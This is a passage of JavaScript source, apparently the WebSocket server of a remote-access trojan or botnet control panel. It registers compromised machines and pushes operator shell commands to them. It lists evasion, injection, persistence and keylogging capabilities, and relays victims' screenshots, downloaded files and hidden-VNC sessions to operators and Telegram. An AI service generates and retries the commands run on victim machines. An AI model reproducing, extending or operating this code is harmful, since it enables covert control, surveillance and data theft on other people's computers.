const { debugLog } = require('../utils/debugLogger');
const mongoose = require('mongoose');
const Client = require('../models/Client');
const Task = require('../models/Task');
const { validateWebSocketMessage } = require('../middleware/validation');
const jwt = require('jsonwebtoken');
const telegramService = require('../services/telegramService');

// Unified AI Service for command processing
const UnifiedAIService = require('../services/unifiedAIService');
const aiService = new UnifiedAIService();

// Store all connected clients (unified approach)
const connectedClients = new Map(); // Map of uuid -> websocket
const adminSessions = new Set(); // Store admin web sessions separately

// Global map for taskId to correlationId
const taskToCorrelationMap = new Map();

// Helper function to get client connection
const getClientConnection = (uuid) => {
  return connectedClients.get(uuid);
};

// Export the helper function
module.exports.getClientConnection = getClientConnection;

// Process pending tasks for a client when they come online
const processPendingTasks = async (clientUuid, ws) => {
    try {
        console.log(`Processing pending tasks for client ${clientUuid}`);
        
        // Get pending tasks for this client (limit to 5 at a time)
        const pendingTasks = await Task.find({
            agentUuid: clientUuid,
            'queue.state': 'pending'
        }).sort({ createdAt: 1 }).limit(5);
        
        console.log(`Found ${pendingTasks.length} pending tasks for client ${clientUuid}`);
        
        for (const task of pendingTasks) {
            try {
                // Prepare command payload
                let commandPayload = {
                    type: 'command',              // ADD THIS - critical for routing
                    cmd: 'execute',
                    taskId: task.taskId,
                    command: task.command,
                    params: task.params || {},
                    timestamp: new Date().toISOString()
                };
                
                // Send command to client
                console.log(`Sending queued command to client ${clientUuid}:`, commandPayload);
                ws.send(JSON.stringify(commandPayload));
                
                // Update task as sent
                await Task.findOneAndUpdate(
                    { taskId: task.taskId },
                    { 
                        $set: { 
                            'queue.state': 'sent',
                            sentAt: new Date(),
                            'queue.attempts': (task.queue.attempts || 0) + 1,
                            'queue.lastAttemptAt': new Date()
                        }
                    }
                );

                // Broadcast task update to admin sessions
                const updatedTask = await Task.findOne({ taskId: task.taskId }).lean();
                broadcastToAdminSessions({
                    type: 'task_updated',
                    task: updatedTask,
                    timestamp: new Date().toISOString()
                });
                
                console.log(`Queued task ${task.taskId} sent to client ${clientUuid}`);
                
                // Small delay between commands to avoid overwhelming the client
                await new Promise(resolve => setTimeout(resolve, 100));
                
            } catch (taskError) {
                console.error(`Error sending queued task ${task.taskId}:`, taskError);
                // Mark task as failed
                await Task.findOneAndUpdate(
                    { taskId: task.taskId },
                    { 
                        $set: { 
                            'queue.state': 'failed',
                            'queue.reason': 'Failed to send queued command',
                            errorMessage: taskError.message
                        }
                    }
                );
            }
        }
    } catch (error) {
        console.error(`Error processing pending tasks for client ${clientUuid}:`, error);
    }
};

// Platform detection utilities
function detectOperatingSystem(platformString, userAgent) {
    if (!platformString && !userAgent) return 'unknown';
    
    const combined = `${platformString || ''} ${userAgent || ''}`.toLowerCase();
    
    if (combined.includes('windows')) return 'windows';
    if (combined.includes('linux')) return 'linux';
    if (combined.includes('macos') || combined.includes('darwin')) return 'macos';
    if (combined.includes('android')) return 'android';
    if (combined.includes('ios')) return 'ios';
    
    return 'unknown';
}

function detectArchitecture(platformString, systemInfo) {
    if (!platformString && !systemInfo) return 'unknown';
    
    const combined = `${platformString || ''} ${JSON.stringify(systemInfo || {})}`.toLowerCase();
    
    if (combined.includes('x64') || combined.includes('amd64') || combined.includes('x86_64')) return 'x64';
    if (combined.includes('arm64') || combined.includes('aarch64')) return 'arm64';
    if (combined.includes('arm')) return 'arm';
    if (combined.includes('x86') || combined.includes('i386') || combined.includes('i686')) return 'x86';
    
    return 'unknown';
}

function extractCapabilities(data) {
    const capabilities = {
        persistence: [],
        injection: [],
        evasion: [],
        commands: [],
        features: []
    };
    
    // Extract capabilities based on platform and reported features
    const os = detectOperatingSystem(data.platform, data.userAgent);
    
    switch (os) {
        case 'windows':
            capabilities.persistence = ['registry', 'startup', 'service', 'task_scheduler'];
            capabilities.injection = ['dll_injection', 'process_hollowing', 'reflective_dll'];
            capabilities.evasion = ['amsi_bypass', 'etw_bypass', 'unhook'];
            capabilities.commands = ['powershell', 'cmd', 'wmi', 'registry'];
            capabilities.features = ['screenshot', 'keylogger', 'file_manager', 'process_manager'];
            break;
        case 'linux':
            capabilities.persistence = ['cron', 'systemd', 'bashrc', 'init_d'];
            capabilities.injection = ['ld_preload', 'ptrace'];
            capabilities.evasion = ['process_hiding', 'rootkit'];
            capabilities.commands = ['bash', 'sh', 'python', 'perl'];
            capabilities.features = ['screenshot', 'file_manager', 'process_manager'];
            break;
        case 'macos':
            capabilities.persistence = ['launchd', 'cron', 'login_items'];
            capabilities.injection = ['dylib_injection', 'mach_inject'];
            capabilities.evasion = ['codesign_bypass', 'gatekeeper_bypass'];
            capabilities.commands = ['bash', 'zsh', 'osascript', 'defaults'];
            capabilities.features = ['screenshot', 'keychain_access', 'file_manager'];
            break;
        default:
            capabilities.commands = ['basic_shell'];
            capabilities.features = ['basic_info'];
    }
    
    // Add reported capabilities if available
    if (data.capabilities) {
        Object.keys(capabilities).forEach(key => {
            if (data.capabilities[key]) {
                capabilities[key] = [...new Set([...capabilities[key], ...data.capabilities[key]])];
            }
        });
    }
    
    return capabilities;
}

// Broadcast function to send data to all admin sessions
function broadcastToAdminSessions(data) {
    const message = JSON.stringify(data);
    console.log(`[BROADCAST] Broadcasting to ${adminSessions.size} admin sessions - Type: ${data.type}`);
    
    let sent = 0;
    let failed = 0;
    
    adminSessions.forEach(client => {
        if (client.readyState === client.OPEN) {
            try {
                client.send(message);
                sent++;
            } catch (error) {
                console.error(`[BROADCAST] Error sending to client:`, error);
                failed++;
            }
        } else {
            console.log(`[BROADCAST] Skipping client - readyState: ${client.readyState}`);
            failed++;
            adminSessions.delete(client);
        }
    });
    
    console.log(`[BROADCAST] Broadcast complete - Sent: ${sent}, Failed: ${failed}`);
}

// WebSocket connection handler with authentication and validation
// Function to get current connection stats for debugging
function getConnectionStats() {
    return {
        totalClients: connectedClients.size + adminSessions.size,
        connectedClients: connectedClients.size,
        adminSessions: adminSessions.size,
        clientIds: Array.from(connectedClients.keys()),
        timestamp: new Date().toISOString()
    };
}

// Function to broadcast connection stats to admin sessions
function broadcastConnectionStats() {
    const stats = getConnectionStats();
    console.log('Current connection stats:', stats);
    broadcastToAdminSessions({
        type: 'connection_stats',
        stats: stats
    });
}

// Main WebSocket handler function
const wsHandler = (ws, req) => {
    let isAuthenticated = false;
    let clientType = 'unknown'; // 'client' or 'admin'
    let clientId = null;
    
    debugLog.wsConnection('New WebSocket connection', { remoteAddress: req.socket.remoteAddress, userAgent: req.headers['user-agent'], timestamp: new Date().toISOString() });
    console.log('Current connections before new connection:', getConnectionStats());
    
    // Set connection timeout for authentication - INCREASED TO 60 SECONDS
    const authTimeout = setTimeout(() => {
        if (!isAuthenticated) {
            console.log('WebSocket connection timeout - no authentication received');
            ws.close(1008, 'Authentication timeout');
        }
    }, 60000); // 60 seconds to authenticate (increased from 30)
    
    ws.on('message', async (message) => {
        try {
            debugLog.wsMessage('WebSocket message received', { remoteAddress: req.socket.remoteAddress, messageSize: message.length, timestamp: new Date().toISOString() });
            let data;
            try {
                data = JSON.parse(message);
                console.log('Parsed WebSocket message:', data);
                debugLog.wsMessage('WebSocket message parsed', { messageType: data.type, uuid: data.uuid, timestamp: new Date().toISOString() });
            } catch (parseError) {
                console.error('Invalid JSON received:', parseError);
                ws.send(JSON.stringify({ 
                    type: 'error', 
                    message: 'Invalid JSON format' 
                }));
                return;
            }
            
            // Debug all incoming messages
            console.log(`[MESSAGE DEBUG] Received message from ${ws.uuid || 'unknown'}:`, JSON.stringify(data));
            
            // Validate message structure and sanitize inputs
            const validationErrors = validateWebSocketMessage(data);
            if (validationErrors.length > 0) {
                console.error('WebSocket message validation failed:', validationErrors);
                ws.send(JSON.stringify({ 
                    type: 'error', 
                    message: 'Message validation failed',
                    errors: validationErrors
                }));
                return;
            }
            
            // Handle authentication for admin sessions
            if (data.type === 'auth' && data.token) {
                console.log('[ADMIN AUTH] Received auth message with token:', data.token.substring(0, 20) + '...');
                console.log('[ADMIN AUTH] JWT_SECRET available:', !!process.env.JWT_SECRET);
                try {
                    const decoded = jwt.verify(data.token, process.env.JWT_SECRET);
                    isAuthenticated = true;
                    clientType = 'admin';
                    clientId = decoded.id; // Changed from userId to id to match token payload
                    clearTimeout(authTimeout);
                    
                    adminSessions.add(ws);
                    console.log(`[ADMIN AUTH] Admin session authenticated: ${clientId}`);
                    console.log(`[ADMIN AUTH] Total admin sessions: ${adminSessions.size}`);
                    
                    ws.send(JSON.stringify({ 
                        type: 'auth_success', 
                        message: 'Authentication successful' 
                    }));
                    
                    console.log('[ADMIN AUTH] Auth success message sent');
                    return;
                } catch (jwtError) {
                    console.error('[ADMIN AUTH] JWT verification failed:', jwtError);
                    console.error('[ADMIN AUTH] Token:', data.token.substring(0, 50) + '...');
                    console.error('[ADMIN AUTH] JWT_SECRET length:', process.env.JWT_SECRET ? process.env.JWT_SECRET.length : 'undefined');
                    ws.send(JSON.stringify({ 
                        type: 'auth_failed', 
                        message: 'Invalid token' 
                    }));
                    ws.close(1008, 'Authentication failed');
                    return;
                }
            }
            
            // For clients, first message should be registration
            if (!isAuthenticated && (data.type === 'register' || data.type === 'agent_register')) {
                debugLog.clientReg('Processing client registration', { uuid: data.uuid, computerName: data.computerName, platform: data.platform, ipAddress: data.ipAddress });
                isAuthenticated = true;
                clientType = 'client';
                clientId = data.uuid || data.agentId;
                ws.uuid = clientId;  // Set on the ws object
                ws.clientType = 'client';  // Set clientType on ws
                clearTimeout(authTimeout);
                
                console.log('Client registered:', clientId);
                
                // Store the connection for client communication
                if (data.uuid || data.agentId) {
                    connectedClients.set(clientId, ws);
                    console.log('Client connection stored:', clientId);
                    console.log('Total connected clients:', connectedClients.size);
                }
                
                // Send success response to client
                ws.send(JSON.stringify({ 
                    type: 'register_success', 
                    message: 'Client registered successfully' 
                }));
                
                // Use integration layer for client registration if available
                try {
                    console.log('Attempting to use integration layer for client registration');
                    const { websocketHandlers } = require('./integration');
                    // Ensure uuid is set from agentId if not provided
                    if (!data.uuid && data.agentId) {
                        data.uuid = data.agentId;
                        console.log('Set uuid from agentId:', data.uuid);
                    }
                    
                    // Normalize platform data before passing to integration layer
                    const normalizedData = {
                        ...data,
                        platform: data.platform || 'Unknown',
                        userAgent: data.userAgent || '',
                        systemInfo: data.systemInfo || {}
                    };
                    
                    // Register client using integration layer
                    const registeredClient = await websocketHandlers.handleClientRegistration(normalizedData, ws);
                    console.log('Integration layer registration completed');
                    
                    // Broadcast the new client to admin sessions
                    const { webPanelIntegration } = require('./integration');
                    const formattedClient = webPanelIntegration.formatClientForWebPanel(registeredClient);
                    broadcastToAdminSessions({
                        type: 'client_status_update',
                        client: formattedClient
                    });
                    console.log('Broadcasted new client to admin sessions');

                    // Send Telegram notification for new client connection
                    try {
                        if (telegramService.isEnabled() && telegramService.getConfig().notifications.newConnection) {
                            const clientInfo = {
                                uuid: data.uuid,
                                computerName: data.computerName || 'Unknown',
                                ipAddress: data.ipAddress || 'Unknown',
                                platform: data.platform || 'Unknown'
                            };
                            await telegramService.sendNewConnectionNotification(clientInfo);
                        }
                    } catch (telegramError) {
                        console.error('[TELEGRAM] Error sending new connection notification:', telegramError);
                    }
                } catch (integrationError) {
                    console.error('Integration layer registration failed:', integrationError.message);
                    
                    // Fallback to direct database registration
                    try {
                        const updateData = {
                            uuid: data.uuid,
                            computerName: data.computerName || 'Unknown',
                            hostname: data.hostname || 'Unknown',
                            ip: data.ip || data.ipAddress || 'Unknown',
                            ipAddress: data.ipAddress || data.ip || 'Unknown',
                            country: data.country || 'Unknown',
                            platform: data.platform || 'Unknown',
                            operatingSystem: data.platform || 'Unknown',
                            osVersion: data.platform || 'Unknown',
                            architecture: data.architecture || 'Unknown',
                            capabilities: data.capabilities || {},
                            systemInfo: data.systemInfo || {},
                            lastHeartbeat: new Date(),
                            status: 'online'
                        };
                        
                        const client = await Client.findOneAndUpdate(
                            { uuid: data.uuid },
                            { 
                                $set: updateData,
                                $inc: { connectionCount: 1 }
                            },
                            { upsert: true, new: true }
                        );
                        
                    console.log('Direct database registration completed:', client.uuid);
                    console.log('Client status in DB:', client.status);
                    console.log('Admin sessions count:', adminSessions.size);
                    
                    // Broadcast the new client to admin sessions
                    const { webPanelIntegration } = require('./integration');
                    const formattedClient = webPanelIntegration.formatClientForWebPanel(client);
                    console.log('Formatted client for broadcast:', JSON.stringify(formattedClient));
                    broadcastToAdminSessions({
                        type: 'client_status_update',
                        client: formattedClient
                    });
                    console.log('Broadcasted new client to admin sessions - message sent to', adminSessions.size, 'admins');
                } catch (dbError) {
                    console.error('Database registration error:', dbError.message);
                }
            }
            
            return; // Exit early after handling registration
        }
            
            // Handle admin session identification
            if (data.type === 'web_client') {
                // If already authenticated via auth token, just acknowledge
                if (isAuthenticated && clientType === 'admin') {
                    ws.send(JSON.stringify({ 
                        type: 'web_client_ack', 
                        message: 'Admin session acknowledged' 
                    }));
                    console.log('Admin session identified');
                    
                    // Send current client list to the newly connected admin
                    const { webPanelIntegration } = require('./integration');
                    const { clientIntegration } = require('./integration');
                    
                    clientIntegration.getAllClients().then(clients => {
                        const formattedClients = webPanelIntegration.formatClientListForWebPanel(clients);
                        ws.send(JSON.stringify({
                            type: 'client_list_update',
                            clients: formattedClients
                        }));
                        console.log('Sent client list to admin:', formattedClients.length, 'clients');
                    }).catch(error => {
                        console.error('Error sending client list to admin:', error);
                    });
                } else {
                    // Admin sessions should authenticate first with auth token
                    ws.send(JSON.stringify({ 
                        type: 'auth_required', 
                        message: 'Authentication required' 
                    }));
                    console.log('Unauthenticated admin session message received');
                }
                return;
            }
            
            
            // Handle client-specific messages (before authentication check)
            if (data.type === 'output') {
                // This is an output message from a client
                const { taskId, output, status } = data;
                
                console.log(`[OUTPUT] Command output from client ${ws.uuid} for task ${taskId}`);
                console.log(`[OUTPUT] Output length: ${output ? output.length : 0} bytes`);
                console.log(`[OUTPUT] Status: ${status}`);
                
                // Get the original task to check if it was AI-processed
                const originalTask = await Task.findOne({ taskId }).lean();
                const isAIProcessed = originalTask && originalTask.params && originalTask.params.aiProcessing;
                
                // Handle AI error retry if command failed and was AI-processed
                if (status === 'error' && isAIProcessed) {
                    const maxRetries = originalTask.params?.aiProcessing?.maxRetries || 3;
                    const retryCount = originalTask.params?.aiProcessing?.retryCount || 0;
                    
                    if (retryCount < maxRetries) {
                        console.log(`[AI ERROR HANDLER] Command failed, attempting AI retry for task ${taskId} (attempt ${retryCount + 1}/${maxRetries})`);
                        
                        try {
                            const clientInfo = {
                                uuid: ws.uuid,
                                platform: ws.platform || 'unknown',
                                systemInfo: ws.systemInfo || {}
                            };
                            
                            // Use Unified AI Service for error handling
                            const errorResult = await aiService.handleErrorWithAI(
                                { message: output },
                                { command: originalTask.command },
                                clientInfo,
                                retryCount
                            );
                            
                            if (errorResult.success && errorResult.data) {
                                const retryCommand = errorResult.data.command;
                                console.log(`[AI ERROR HANDLER] Generated retry command:`, retryCommand);
                                
                                // Update task with retry information
                                await Task.findOneAndUpdate(
                                    { taskId: taskId },
                                    { 
                                        $set: {
                                            command: retryCommand,
                                            'params.aiProcessing.retryCount': retryCount + 1,
                                            'params.aiProcessing.lastError': output,
                                            'params.aiProcessing.lastFix': errorResult.data.explanation,
                                            'queue.state': 'pending',
                                            'queue.attempts': (originalTask.queue.attempts || 0) + 1
                                        }
                                    }
                                );
                                
                                // Send retry command to client
                                const retryMessage = {
                                    type: 'command',
                                    cmd: 'execute',
                                    command: retryCommand,
                                    taskId: taskId,
                                    timestamp: new Date().toISOString()
                                };
                                
                                ws.send(JSON.stringify(retryMessage));
                                console.log(`[AI ERROR HANDLER] Retry command sent to client ${ws.uuid}`);
                                
                                // Broadcast retry attempt to admin sessions
                                broadcastToAdminSessions({
                                    type: 'command_retry',
                                    taskId: taskId,
                                    retryCount: retryCount + 1,
                                    fixApplied: errorResult.data.explanation,
                                    changesMade: errorResult.data.changes_made || [],
                                    timestamp: new Date().toISOString()
                                });
                                
                                return; // Don't process as final output yet
                            }
                        } catch (retryError) {
                            console.error(`[AI ERROR HANDLER] Error in retry processing:`, retryError);
                        }
                    } else {
                        console.log(`[AI ERROR HANDLER] Max retries reached for task ${taskId}`);
                    }
                }
                
                // Update task in database
                if (taskId) {
                    const updateData = {
                        output: output,
                        completedAt: new Date(),
                        executionTimeMs: Date.now() - (new Date().getTime() - 60000) // Rough estimate
                    };
                    
                    if (status === 'success') {
                        updateData['queue.state'] = 'completed';
                        
                        // AI learning functionality removed
                    } else {
                        updateData['queue.state'] = 'failed';
                        updateData.errorMessage = output;
                        
                        // AI learning functionality removed
                    }
                    
                    await Task.findOneAndUpdate(
                        { taskId: taskId },
                        { $set: updateData }
                    );
                    
                    console.log(`[OUTPUT] Task ${taskId} updated with status: ${status}`);

                    // Broadcast task update to admin sessions
                    const updatedTask = await Task.findOne({ taskId }).lean();
                    broadcastToAdminSessions({
                        type: 'task_updated',
                        task: updatedTask,
                        timestamp: new Date().toISOString()
                    });
                }
                
                // Get correlationId from map
                const correlationId = taskToCorrelationMap.get(taskId);
                console.log(`[OUTPUT] CorrelationId from map: ${correlationId}`);
                console.log(`[OUTPUT] TaskToCorrelationMap size: ${taskToCorrelationMap.size}`);
                console.log(`[OUTPUT] Admin sessions count: ${adminSessions.size}`);
                
                // Broadcast output to admin sessions with correlationId
                const broadcastMessage = {
                    type: 'output',
                    uuid: ws.uuid,
                    taskId: taskId,
                    correlationId: correlationId,  // Include correlationId
                    output: output,
                    status: status || 'success',
                    timestamp: new Date().toISOString()
                };
                
                console.log(`[OUTPUT] Broadcasting to ${adminSessions.size} admin sessions:`, JSON.stringify(broadcastMessage));
                broadcastToAdminSessions(broadcastMessage);
                console.log(`[OUTPUT] Broadcast complete`);

                // Send to Telegram if enabled
                try {
                    if (telegramService.isEnabled()) {
                        const client = connectedClients.get(ws.uuid);
                        if (client) {
                            const clientInfo = {
                                uuid: ws.uuid,
                                computerName: client.computerName || 'Unknown',
                                ipAddress: client.ipAddress || 'Unknown',
                                platform: client.platform || 'Unknown'
                            };

                            // Handle different types of outputs
                            if (status === 'success' && output) {
                                // Check if it's a screenshot command
                                if (originalTask && originalTask.command && originalTask.command.toLowerCase().includes('screenshot')) {
                                    // For screenshots, we'll send the base64 data as an image
                                    if (output.startsWith('data:image/')) {
                                        await telegramService.sendScreenshot(clientInfo, output, 'Screenshot captured');
                                    } else {
                                        // If it's not base64, send as text
                                        await telegramService.sendCommandOutput(clientInfo, originalTask.command, output, status);
                                    }
                                } else if (originalTask && originalTask.command && originalTask.command.toLowerCase().includes('download')) {
                                    // For download commands, send file info
                                    await telegramService.sendFileDownload(clientInfo, originalTask.command, output, status);
                                } else {
                                    // For other commands, send as text output
                                    await telegramService.sendCommandOutput(clientInfo, originalTask ? originalTask.command : 'Unknown Command', output, status);
                                }
                            } else if (status === 'error') {
                                // Send error messages
                                await telegramService.sendCommandOutput(clientInfo, originalTask ? originalTask.command : 'Unknown Command', output, status);
                            }
                        }
                    }
                } catch (telegramError) {
                    console.error('[TELEGRAM] Error sending output to Telegram:', telegramError);
                }

                // Clean up the map entry
                if (taskToCorrelationMap.has(taskId)) {
                    taskToCorrelationMap.delete(taskId);
                }
                return;
            }
            
            // Reject messages from unauthenticated connections
            if (!isAuthenticated) {
                console.log('Rejecting message from unauthenticated connection');
                ws.send(JSON.stringify({ 
                    type: 'error', 
                    message: 'Authentication required' 
                }));
                return;
            }

            // Handle admin session identification
            if (data.type === 'web_client' && clientType === 'admin') {
                ws.clientType = 'admin';
                adminSessions.add(ws);
                console.log('Admin session connected. Total admin sessions:', adminSessions.size);
                console.log('Updated connection stats:', getConnectionStats());
                
                // Send current client list to new admin session
                const clients = await Client.find({});
                const { webPanelIntegration } = require('./integration');
                const formattedClients = webPanelIntegration.formatClientListForWebPanel(clients);
                ws.send(JSON.stringify({
                    type: 'client_list_update',
                    clients: formattedClients
                }));
                return;
            }

            // Handle capability discovery messages
            if (data.type === 'capability_report') {
                const { uuid, capabilities: reportedCapabilities } = data;
                if (uuid) {
                    await Client.findOneAndUpdate(
                        { uuid: uuid },
                        { 
                            $set: { 
                                capabilities: reportedCapabilities,
                                lastHeartbeat: new Date()
                            }
                        }
                    );
                    
                    // Broadcast capability update to admin sessions
                    broadcastToAdminSessions({
                        type: 'client_capabilities_update',
                        uuid: uuid,
                        capabilities: reportedCapabilities
                    });
                }
                return;
            }

            if (data.type === 'heartbeat') {
                // Handle heartbeat messages from clients
                const { uuid } = data;
                if (uuid) {
                    console.log(`Received heartbeat from client ${uuid}`);
                    
                    // Check if client is registered
                    if (!connectedClients.has(uuid)) {
                        console.log(`Heartbeat from unregistered client ${uuid}, ignoring`);
                        return;
                    }
                    
                    // Use integration layer for heartbeat handling if available
                    try {
                        const { websocketHandlers } = require('./integration');
                        await websocketHandlers.handleClientHeartbeat(data);
                        console.log(`Heartbeat processed for client ${uuid}`);
                    } catch (error) {
                        console.log('Integration layer heartbeat error:', error.message);
                        // Fallback to direct database update with system info
                        const systemInfo = data.systemInfo || {};
                        const uptimeSeconds = systemInfo.uptime || 0;
                        const bootTime = systemInfo.bootTime ? new Date(systemInfo.bootTime) : null;
                        
                        await Client.findOneAndUpdate(
                            { uuid: uuid },
                            { 
                                $set: { 
                                    lastHeartbeat: new Date(),
                                    status: 'online',
                                    lastActiveTime: new Date(),
                                    uptimeSeconds: uptimeSeconds,
                                    ...(bootTime && { bootTime: bootTime })
                                }
                            }
                        );
                        console.log(`Fallback heartbeat update for client ${uuid}`);
                    }
                }
                return;
            }

            if (data.type === 'hvnc_response') {
                // Handle HVNC session responses from client
                const { sessionId, status, error, frameData, screenInfo } = data;
                
                // Update agent HVNC session status
                if (sessionId) {
                    const updateData = {
                        'hvncSession.status': status,
                        'hvncSession.lastUpdate': new Date()
                    };
                    
                    if (error) {
                        updateData['hvncSession.error'] = error;
                    }
                    
                    if (screenInfo) {
                        updateData['hvncSession.screenInfo'] = screenInfo;
                    }
                    
                    await Client.findOneAndUpdate(
                        { uuid: ws.uuid },
                        { $set: updateData }
                    );
                }
                
                // Broadcast HVNC response to admin sessions
                broadcastToAdminSessions({
                    type: 'hvnc_response',
                    agentUuid: ws.uuid,
                    sessionId,
                    status,
                    error,
                    frameData,
                    screenInfo,
                    timestamp: new Date().toISOString()
                });
                return;
            }

            if (data.type === 'hvnc_frame') {
                // Handle HVNC frame data from client
                const { sessionId, frameData, frameInfo } = data;
                
                // Broadcast frame data to admin sessions
                broadcastToAdminSessions({
                    type: 'hvnc_frame',
                    agentUuid: ws.uuid,
                    sessionId,
                    frameData,
                    frameInfo,
                    timestamp: new Date().toISOString()
                });
                return;
            }

            // Debug command handling
            if (data.type === 'command') {
                console.log(`[COMMAND DEBUG] Received command message. clientType: ${clientType}, isAuthenticated: ${isAuthenticated}`);
                console.log(`[COMMAND DEBUG] Command data:`, JSON.stringify(data));
            }

            // Handle AI-powered simple commands
            if (data.type === 'simple_command' && clientType === 'admin') {
                console.log(`[AI COMMAND] Processing simple command from admin`);
                console.log(`[AI COMMAND] Command data:`, JSON.stringify(data));
                
                const { targetId, category, action, params, correlationId } = data;
                
                try {
                    // Find target client
                    let targetClient = null;
                    let targetUuid = null;
                    
                    if (targetId && targetId.length === 36 && targetId.includes('-')) {
                        targetClient = connectedClients.get(targetId);
                        targetUuid = targetId;
                    } else {
                        for (const [uuid, client] of connectedClients.entries()) {
                            if (client.ipAddress === targetId || client.ipAddress === targetId.replace(/[()]/g, '')) {
                                targetClient = client;
                                targetUuid = uuid;
                                break;
                            }
                        }
                    }
                    
                    if (!targetClient || targetClient.clientType !== 'client') {
                        throw new Error('Client not found or not connected');
                    }
                    
                    // Process command with AI
                    const clientInfo = {
                        uuid: targetUuid,
                        platform: targetClient.platform || 'unknown',
                        systemInfo: targetClient.systemInfo || {}
                    };
                    
                    console.log(`[AI COMMAND] Processing command for client:`, clientInfo);
                    
                    // Process command with Unified AI Service
                    let optimizedCommand;
                    try {
                        const userInput = params?.userInput || `${category} ${action}`;
                        const aiResult = await aiService.processCommandWithAI(
                            userInput,
                            clientInfo,
                            { category, action, params }
                        );
                        
                        if (aiResult.success && aiResult.data) {
                            optimizedCommand = {
                                command: aiResult.data.command,
                                type: aiResult.data.type || 'powershell',
                                timeout: aiResult.data.timeout || 300,
                                explanation: aiResult.data.explanation,
                                aiProcessed: true,
                                provider: aiResult.data.provider || 'unknown'
                            };
                            console.log(`[AI COMMAND] AI processed command:`, optimizedCommand);
                        } else {
                            throw new Error('AI processing failed');
                        }
                    } catch (aiError) {
                        console.error(`[AI COMMAND] AI processing error:`, aiError);
                        // Fallback to simple command generation
                        optimizedCommand = {
                            command: `Write-Host "Processing ${category} ${action}"; if (${category} -eq 'system_info') { Get-ComputerInfo } else { echo "Command: ${category} ${action}" }`,
                            type: 'powershell',
                            timeout: 300,
                            aiProcessed: false
                        };
                        console.log(`[AI COMMAND] Using fallback command:`, optimizedCommand);
                    }
                    
                    // Generate task ID
                    const taskId = `ai_cmd_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
                    
                    // Create task in database
                    const task = new Task({
                        taskId: taskId,
                        agentUuid: targetUuid,
                        command: optimizedCommand.command,
                        params: {
                            originalParams: params,
                            fallback: true
                        },
                        createdBy: clientId || 'admin',
                        platform: targetClient.platform || 'unknown',
                        queue: {
                            state: 'pending',
                            attempts: 0,
                            priority: 0
                        }
                    });
                    await task.save();
                    
                    // Send optimized command to client
                    const commandMessage = {
                        type: 'command',
                        cmd: 'execute',
                        command: optimizedCommand.command,
                        taskId: taskId,
                        timestamp: new Date().toISOString()
                    };
                    
                    targetClient.send(JSON.stringify(commandMessage));
                    console.log(`[AI COMMAND] Optimized command sent to client ${targetUuid} with taskId: ${taskId}`);
                    
                    // Send confirmation back to admin
                    ws.send(JSON.stringify({
                        type: 'command_sent',
                        targetId: targetId,
                        command: optimizedCommand.command,
                        taskId: taskId,
                        correlationId: correlationId,
                        status: 'success',
                        aiProcessed: true,
                        timestamp: new Date().toISOString()
                    }));
                    
                    // Store correlationId in map
                    taskToCorrelationMap.set(taskId, correlationId);
                    
                    // Broadcast task creation
                    broadcastToAdminSessions({
                        type: 'task_created',
                        task: task.toObject(),
                        timestamp: new Date().toISOString()
                    });
                    
                } catch (error) {
                    console.error(`[AI COMMAND] Error processing simple command:`, error);
                    ws.send(JSON.stringify({
                        type: 'command_sent',
                        targetId: targetId,
                        command: null,
                        taskId: null,
                        correlationId: correlationId,
                        status: 'error',
                        error: error.message,
                        timestamp: new Date().toISOString()
                    }));
                }
                return;
            }

            if (data.type === 'command' && clientType === 'admin') {
                // Handle command from admin to client
                const { targetId, command, correlationId } = data;
                console.log(`Admin sending command to client ${targetId}: ${command}`);

                // Find the target client WebSocket by UUID or IP address
                let targetClient = null;
                let targetUuid = null;
                
                // First try to find by UUID (if targetId is a UUID)
                if (targetId && targetId.length === 36 && targetId.includes('-')) {
                    targetClient = connectedClients.get(targetId);
                    targetUuid = targetId;
                } else {
                    // Try to find by IP address
                    for (const [uuid, client] of connectedClients.entries()) {
                        if (client.ipAddress === targetId || client.ipAddress === targetId.replace(/[()]/g, '')) {
                            targetClient = client;
                            targetUuid = uuid;
                            break;
                        }
                    }
                }
                
                console.log(`[COMMAND] Target lookup - targetId: ${targetId}, found client: ${targetUuid}, clientType: ${targetClient?.clientType}`);

                if (targetClient && targetClient.clientType === 'client') {
                    // Generate task ID
                    const taskId = `cmd_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

                    // Create task in database
                    const task = new Task({
                        taskId: taskId,
                        agentUuid: targetUuid,  // Use the actual UUID, not targetId
                        command: command,
                        params: {},  // Add params if needed
                        createdBy: clientId || 'admin',  // Use admin clientId
                        platform: targetClient.platform || 'unknown',
                        queue: {
                            state: 'pending',
                            attempts: 0,
                            priority: 0
                        }
                    });
                    await task.save();
                    console.log('Task created:', taskId);

                    // Send command to target client
                    const commandMessage = {
                        type: 'command',        // FIXED - for message routing
                        cmd: 'execute',         // Correct - for command type
                        command: command,       // All clients expect this
                        taskId: taskId,         // All clients expect this
                        timestamp: new Date().toISOString()
                    };

                    targetClient.send(JSON.stringify(commandMessage));
                    console.log(`Command sent to client ${targetId} with taskId: ${taskId}`);

                    // Send confirmation back to admin with correlationId
                    ws.send(JSON.stringify({
                        type: 'command_sent',
                        targetId: targetId,
                        command: command,
                        taskId: taskId,
                        correlationId: correlationId,  // Include correlationId
                        status: 'success',
                        timestamp: new Date().toISOString()
                    }));

                    // Broadcast task creation to admin sessions
                    broadcastToAdminSessions({
                        type: 'task_created',
                        task: task.toObject(),
                        timestamp: new Date().toISOString()
                    });

                    // Store correlationId in map
                    taskToCorrelationMap.set(taskId, correlationId);
                    console.log(`[COMMAND] Stored correlationId mapping: ${taskId} -> ${correlationId}`);
                    console.log(`[COMMAND] TaskToCorrelationMap size: ${taskToCorrelationMap.size}`);
                } else {
                    console.log(`Client ${targetId} not found or not connected`);
                    ws.send(JSON.stringify({
                        type: 'command_sent',
                        targetId: targetId,
                        command: command,
                        taskId: null,
                        correlationId: correlationId,  // Still include if provided
                        status: 'error',
                        error: 'Client not found or not connected',
                        timestamp: new Date().toISOString()
                    }));
                }
                return;
            }

            // Handle client messages - only process if client is already registered
            if (data.uuid && connectedClients.has(data.uuid)) {
                ws.uuid = data.uuid;
                ws.clientType = 'client';
            } else if (data.uuid && !connectedClients.has(data.uuid)) {
                console.log(`Received message from unregistered client ${data.uuid}, ignoring`);
                return; // Ignore messages from unregistered clients
            } else {
                return; // Ignore messages without a UUID
            }
            
            console.log(`Received data from client ${data.uuid}`);

            // Detect platform information
            const operatingSystem = detectOperatingSystem(data.platform, data.userAgent);
            const architecture = detectArchitecture(data.platform, data.systemInfo);
            const capabilities = extractCapabilities(data);

